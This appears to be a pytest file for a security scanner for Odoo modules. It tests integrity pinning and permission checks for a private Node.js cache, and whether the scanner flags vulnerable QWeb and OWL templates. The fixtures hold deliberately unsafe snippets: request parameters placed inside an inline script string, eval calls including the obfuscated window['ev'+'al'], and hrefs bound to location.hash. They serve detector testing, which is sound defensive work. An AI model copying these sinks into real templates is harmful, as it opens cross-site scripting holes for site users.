def test_h1_tampered_private_closure_rebuilt_and_verified(tmp_path, monkeypatch):
    web = _webmod()
    if web.helper_problem():
        pytest.skip("helper unavailable")
    monkeypatch.setattr(web, "NODE_CACHE_ROOT", tmp_path / "c")
    pin = web._pin()
    d, why = web._private_node(pin)
    assert why is None and web._tree_shas(d) == pin["private_sha256"]
    lib = sorted((d / "lib").iterdir())[0]
    lib.write_bytes(lib.read_bytes() + b"\0")
    d2, why = web._private_node(pin)
    assert why is None and d2 == d and web._tree_shas(d) == pin["private_sha256"]
    bad = dict(pin, private_sha256={"bin/node": "0" * 64})
    lib.write_bytes(b"x")
    assert web._private_node(bad) == (None, "Node.js private closure does not match its pin")


def test_h1_private_root_must_be_owner_only(tmp_path, monkeypatch):
    web = _webmod()
    pin = web._pin()
    if pin is None:
        pytest.skip("node not pinned on this host")
    root = tmp_path / "c"
    root.mkdir(mode=0o755)
    root.chmod(0o755)
    monkeypatch.setattr(web, "NODE_CACHE_ROOT", root)
    assert web._private_node(pin) == (None, "private Node.js directory is not owner-only")


# --- H9: request data into a <script> string literal is HIGH ------------------------


def test_h9_request_data_in_script_string_high():
    v = (
        "<odoo><template id='x' inherit_id='website.layout'><xpath expr='.' "
        "position='inside'><script>var a='<t t-out=\"request.params.get('q')\"/>';"
        "</script></xpath></template></odoo>"
    )
    assert ("qweb-script-injection", "high") in codes({"views/x.xml": v})


# --- H12: static OWL template expressions go through the JS checks --------------------


@pytest.mark.parametrize(
    "attr,want",
    [
        ("t-on-click='()=>eval(props.c)'", ("js-eval", "high")),
        ('t-on-click=\'() => window["ev"+"al"](props.c)\'', ("js-eval", "high")),
        ("t-att-href='location.hash'", ("owl-url-attr", "high")),
        ("t-att-href='props.record.data.url'", ("owl-url-attr", "medium")),
    ],
)
def test_h12_static_owl_expressions(attr, want):
    x = f"<templates><t t-name='a'><a {attr}/></t></templates>"
    assert want in codes({"static/src/a.xml": x})


@pytest.mark.parametrize(
    "attr",
    [
        "t-att-class='class'",
        "t-att-id='props.id and props.x or \"y\"'",
        "t-attf-id='{{props.id or \"a\"}}_{{i}}'",
        "t-att-style=\"'padding-left:' + (props.level * 10) + 'px';\"",
        "t-call-context='{ this, props: props }'",
        "t-att-href=\"props.v ? 'mailto:' + props.v : undefined\"",
    ],
)
def test_h12_owl_syntax_parses_and_safe_prefix_quiet(attr):
    x = f"<templates><t t-name='a'><a {attr}/></t></templates>"
    got = {c for c in codes({"static/src/a.xml": x}) if c[1] in ("high", "medium")}
    assert got == set()


def test_h12_owl_dynamic_call_low_server_medium():
    x = "<templates><t t-name='a'><t t-call='{{ tpl }}'/></t></templates>"
    assert ("qweb-dynamic-call", "low") in codes({"static/src/a.xml": x})
